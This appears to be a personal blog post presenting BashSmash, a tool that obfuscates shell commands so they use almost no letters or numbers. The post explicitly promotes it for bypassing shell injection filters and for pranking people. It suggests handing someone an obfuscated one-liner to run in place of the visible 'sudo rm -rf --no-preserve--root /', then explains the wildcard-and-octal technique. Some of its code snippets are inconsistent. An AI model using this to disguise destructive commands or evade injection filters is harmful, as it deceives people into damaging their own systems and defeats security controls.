---
layout: page
title:  "BashSmash"
description: "A tool for driving people crazy"
date:   2019-06-26 15:48:00
tags: projects
---

I was watching this great [Liveoverflow video](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwiOhNze_4fjAhUiB50JHR12D8AQwqsBMAB6BAgJEAQ&url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D6D1LnMj0Yt0&usg=AOvVaw2nOgft0SoPZujc9js9Vxhx) yesterday, and really liked the idea of building escape sequences with strings. So, I built a new tool, [BashSmash](https://pypi.org/project/bashsmash/). 

## The goal
The goal of BashSmash is very similar to that described in Liveoverflow's video. Do anything in bash without using any letters or numbers except `n` and `f` (he used `i` instead of `f`). This can both bypass shell injection filters, and generally mess with people.

Saying "Hey, you should run:"
```bash
__() {/???/???/???n?f ${#};}; $(/???/???/???n?f $(/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" "" ``__ "" "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" "" ``__ "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" ``__ "" "" "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" ``__ "" "" "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" "" "" "" ``__ `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" "" ``__ "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" ``__ "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" "" "" "" ``__ `";/???/???/???n?f "\\\\`__ "" "" "" "" "" ``__ "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" "" ``__ "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" ``__ "" "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" "" "" "" ``__ `";/???/???/???n?f "\\\\`__ "" "" "" "" "" ``__ "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" "" "" "" "" ``__ "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" ``__ "" "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" ``__ "" "" "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" "" "" "" "" ``__ "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" "" ``__ `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" "" ``__ "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" ``__ "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" "" ``__ "" "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" ``__ "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" "" ``__ "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" "" ``__ "" "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" ``__ "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" "" "" "" "" ``__ "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" "" ``__ "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" ``__ "" "" "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" ``__ "" "" "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" "" ``__ "" "" "" "" `";/???/???/???n?f "\\\\`__ "" "" "" "" ``__ `";/???/???/???n?f "\\\\`__ "" "" "" "" "" ``__ "" "" "" "" "" "" "" `";););
```

Instead of:
```bash
sudo rm -rf --no-preserve--root /
```

Can usually get you much farther with your goal of world domination.

## How does this work?
BashSmash abuses bash wildcards, octal escape codes, and a large number of backslashes to obfuscate any valid shell script.

Firstly, it is important to know that `printf` will gladly convert any octal to a string, and bash's eval (`$()`) function will gladly run any string as a bash script. (See where this is going?)

Because of these tools, we know that the following is possible:
```bash
# Printf-ing a string will print the string
printf "hello" # This will return hello

# Printf-ing a sequence of octal escapes will also print a string
printf "\150\145\154\154\157" # This will also return hello

# Eval-ing a printf of an octal escape sequence will build a string, then run it in bash
$(printf "\150\145\154\154\157") # This will warn that "hello" is not a valid command
```

This has some issues. You may have noticed that letters are required to spell `printf`, and numbers are needed for the octal escapes. Let's start by fixing the letters problem.

Bash allows wildcards. You may have run something like `cp ./foo/* ./bar` before. This uses the wildcard `*`. The `*` wildcard will be auto-evaluated to expand into a list of all files in it's place.
```bash
# Let's assume that ./foo contains the following files:
#   john.txt
#   carl.txt

# Running the following:
cat ./foo/*

# Will automatically expand to:
cat ./foo/john.txt ./foo/carl.txt

# Now, lets assume that ./baz contains a single file:
#   KillHumans.sh

# Running:
./baz/*

# Will execute KillHumans.sh
```

Neat, Right? To take this a step further, you can use the second wildcard, `?`, to specify the number of characters you want to look for. Running `./baz/?` will not run `KillHumans.sh` because `KillHumans.sh` is not 1 char long. But `./baz/?????????????` will. This is messy, but it works.

Now, back to our problem with `printf`. `printf` is located in `/usr/bin/printf` on all *nix systems. This is handy as, firstly, this can be wildcarded, and secondly, the path contains 2 `n`'s and an `f` (the two letters we are allowed to use). So, instead of calling `printf`, we can call `/???/??n/???n?f`. 
```bash
# Now, we can call:
/???/??n/???n?f "\150\145\154\154\157"

# To print "hello". Or:
$(/???/??n/???n?f "\150\145\154\154\157")

# To run "hello" as a program (still gives an error)
```

Now, our problem with letters is solved, but we are still using numbers.

Bash allows anyone to define functions. These functions can take arguments and call other programs. So, what if we have a function that can take any number of arguments, and return the number of arguments as a number? This will be helpful because an empty argument can be added with `""` (not a number or letter), and this will replace the need for numbers in our code. On a side note, bash allows `__` as a function name, so that's cool. 

```bash
# Our function needs to do the following:
#   - Take any number of arguments
#   - Turn the number to a string
#   - Print the string so it can be evaluated back to a number with $()

# First, we start with an empty function, named __ (two underscores)
__() {};

# Easy. Next, we use a built-in feature of bash to count the number of arguments passed
__() { ${#} };

# With the ${#} feature in bash, giving this function 3 arguments will return a 3
# Next, we need to print this number to stdout 
# This can be done with printf
# We still do not want to use any letters or numbers, so we must use our string of wildcards
/???/??n/???n?f

# So, we just plug this into our function
__() {/???/??n/???n?f ${#}};

# Now, calling our function with three arguments
__ "" "" ""
# Will print:
3
```

Let's put this together. First, we must tell bash that our `__` function exists. 
``` bash
# We do this by starting our new script with: 
__() {/???/??n/???n?f ${#}};

# Next, an eval to actually run our constructed string. Together it now looks like this:
__() {/???/??n/???n?f ${#}); $(/???/??n/???n?f )

# Now, we construct a string using the __ function over and over again. "echo hello" looks like:
__() {/???/???/???n?f ${#};}; $(/???/???/???n?f $(/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" ``__ "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" ``__ "" "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" ``__ `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" ``__ "" "" "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" "" "" "" ``__ `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" ``__ `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" ``__ "" "" "" "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" ``__ "" "" "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" ``__ "" "" "" "" `";/???/???/???n?f "\\\\`__ "" ``__ "" "" "" "" "" ``__ "" "" "" "" "" "" "" `";););
```

Thats it! You do not actually have to worry about this, because BashSmash does it all for you automatically.

## How do I use the script?
To use BashSmash, simply make sure both `python3.7` and `python3-pip` are installed on your computer, then run:
```
pip3 install bashsmash
```

For more info, see the [PYPI Page](https://pypi.org/project/bashsmash/).

## Why do you have a desire to break things with python
Because it is fun. Give it a try! 

I will have a post here at some point about the weird things I do in my python code and why I do them.